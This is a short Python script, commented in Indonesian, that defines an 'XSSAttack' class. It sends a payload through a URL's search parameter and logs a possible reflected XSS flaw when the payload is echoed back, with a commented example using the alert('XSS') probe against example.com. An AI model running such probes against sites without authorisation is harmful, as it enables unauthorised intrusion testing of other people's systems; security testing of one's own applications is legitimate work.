import requests
import logging

logger = logging.getLogger(__name__)

class XSSAttack:
    def __init__(self, target_url):
        self.target_url = target_url

    def attack(self, payload):
        """
        Mengirimkan payload XSS ke target.
        """
        try:
            response = requests.get(self.target_url, params={"search": payload})
            if payload in response.text:
                logger.info(f"Potential XSS vulnerability found at {self.target_url}")
            else:
                logger.info("No XSS detected.")
        except Exception as e:
            logger.error(f"Error during XSS attack: {str(e)}")

# Contoh penggunaan:
# xss = XSSAttack("http://example.com/search")
# xss.attack("<script>alert('XSS')</script>")
